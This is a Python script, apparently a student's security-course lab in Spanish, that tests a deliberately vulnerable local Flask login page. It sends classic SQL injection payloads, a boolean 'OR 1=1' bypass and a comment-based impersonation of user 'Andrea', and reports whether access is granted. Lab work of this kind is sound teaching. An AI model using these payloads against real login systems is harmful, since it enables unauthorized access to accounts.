import requests
# URL donde el servidor Flask escucha localmente
URL_LOGIN = "http://127.0.0.1:5000/vulnerable"

def ejecutar_prueba(nombre_prueba, payload_usuario, payload_password):
    """
    Función auxiliar para enviar datos al formulario web de Flask
    y analizar la respuesta obtenida.
    """
    print("=" * 70)
    print(f"PRUEBA: {nombre_prueba}")
    print(f"Payload Usuario:   [ {payload_usuario} ]")
    print(f"Payload Password:  [ {payload_password} ]")
    print("-" * 70)
    
    # Empaquetado de los campos del formulario HTML
    datos_form = {
        'usuario': payload_usuario,
        'contrasena': payload_password
    }
    
    try:
        # Envío de la petición HTTP POST al servidor local
        respuesta = requests.post(URL_LOGIN, data=datos_form)
        
        # Evaluación del contenido retornado por el servidor Flask
        if "Inicio de sesión exitoso" in respuesta.text:
            print("[RESULTADO]: ACCESO CONCEDIDO -> Se logró autenticación en el sistema.")
        elif "Usuario o contraseña incorrectos" in respuesta.text:
            print("[RESULTADO]: ACCESO DENEGADO -> Las credenciales fueron rechazadas.")
        elif "Error en la consulta SQL" in respuesta.text:
            print("[RESULTADO]: ERROR DE SINTAXIS -> La consulta SQL generó un fallo.")
        else:
            print("[RESULTADO]: RESPUESTA DESCONOCIDA -> Verificar plantilla HTML.")
            
    except requests.exceptions.ConnectionError:
        print("[ERROR]: No se pudo establecer conexión con http://127.0.0.1:5000/")
        print("Asegúrate de tener ejecutando 'python app_vulnerable.py' en otra terminal.")
    
    print("=" * 70 + "\n")

if __name__ == "__main__":
    print("\n   MÓDULO DE PRUEBAS DE SEGURIDAD - INTEGRANTE 3")
    print("   Estudiante: Tito Cruz | Asignatura: Seguridad Informática\n")
    
    # 1. Prueba de control con credenciales incorrectas
    ejecutar_prueba(
        nombre_prueba="1. Autenticación con Credenciales Incorrectas",
        payload_usuario="usuario_falso",
        payload_password="password_erroneo"
    )
    
    # 2. Prueba de inyección SQL (Payload de bypass booleano)
    ejecutar_prueba(
        nombre_prueba="2. Evaluación de Inyección SQL (Bypass)",
        payload_usuario="' OR '1'='1' --",
        payload_password="clave_cualquiera"
    )
    
    # 3. Prueba de inyección SQL (Suplantación de usuario específico)
    ejecutar_prueba(
        nombre_prueba="3. Evaluación de Inyección SQL (Usuario Andrea)",
        payload_usuario="Andrea' --",
        payload_password="123"
    )